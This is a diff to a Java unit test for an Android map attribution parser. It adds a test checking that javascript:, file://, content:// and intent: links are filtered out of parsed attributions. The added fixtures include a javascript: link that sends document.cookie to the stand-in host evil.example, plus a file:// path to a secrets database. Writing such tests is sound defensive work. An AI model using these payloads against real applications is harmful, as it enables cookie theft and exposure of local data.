@@ -18,6 +18,10 @@ public class AttributionParseTest {
   private static final String SATELLITE_ATTRIBUTION = "<a href=\"https://www.mapbox.com/about/maps/\" target=\"_blank\">&copy; Mapbox</a> <a href=\"http://www.openstreetmap.org/about/\" target=\"_blank\">&copy; OpenStreetMap</a> <a class=\"mapbox-improve-map\" href=\"https://apps.mapbox.com/feedback/\" target=\"_blank\">Improve this map</a> <a href=\"https://www.digitalglobe.com/\" target=\"_blank\">&copy; DigitalGlobe</a>\n";
   private static final String CUSTOM_ATTRIBUTION = "&copy; Custom Contributors";
   private static final String CUSTOM_ATTRIBUTION_OPENSTREET = "OpenStreetMap CC-BY-SA";
+  private static final String MALICIOUS_ATTRIBUTION_JAVASCRIPT = "<a href=\"javascript:fetch('https://evil.example/'+document.cookie)\">&copy; Mapbox</a>";
+  private static final String MALICIOUS_ATTRIBUTION_FILE = "<a href=\"file:///data/data/com.example/databases/secrets.db\">&copy; Mapbox</a>";
+  private static final String MALICIOUS_ATTRIBUTION_CONTENT = "<a href=\"content://com.example.provider/data\">&copy; Mapbox</a>";
+  private static final String MALICIOUS_ATTRIBUTION_INTENT = "<a href=\"intent:#Intent;action=android.intent.action.VIEW;end\">&copy; Mapbox</a>";
 
   @Test
   public void testParseAttributionStringSatellite() throws Exception {
@@ -348,6 +352,31 @@ public class AttributionParseTest {
       "© Mapbox / OSM / DigitalGlobe",
       attributionParser.createAttributionString(true)
     );
+  }
+
+  @Test
+  public void testMaliciousUrlSchemesAreFilteredAtParser() throws Exception {
+    String[] maliciousAttributions = {
+      MALICIOUS_ATTRIBUTION_JAVASCRIPT,
+      MALICIOUS_ATTRIBUTION_FILE,
+      MALICIOUS_ATTRIBUTION_CONTENT,
+      MALICIOUS_ATTRIBUTION_INTENT
+    };
+    for (String maliciousAttribution : maliciousAttributions) {
+      AttributionParser attributionParser = new AttributionParser.Options(RuntimeEnvironment.application)
+        .withAttributionData(maliciousAttribution)
+        .withMapboxAttribution(true)
+        .withImproveMap(false)
+        .withTelemetryAttribution(false)
+        .withMapboxPrivacyPolicy(false)
+        .withMapboxGeofencingConsent(false)
+        .build();
+      for (Attribution attribution : attributionParser.getAttributions()) {
+        String scheme = attribution.getUrl().isEmpty() ? "" : android.net.Uri.parse(attribution.getUrl()).getScheme();
+        boolean isSafe = scheme == null || scheme.equals("http") || scheme.equals("https") || attribution.getUrl().isEmpty();
+        assertEquals("Non-http(s) scheme must not appear in parsed attributions: " + attribution.getUrl(), true, isSafe);
+      }
+    }
   }
 
   @Test
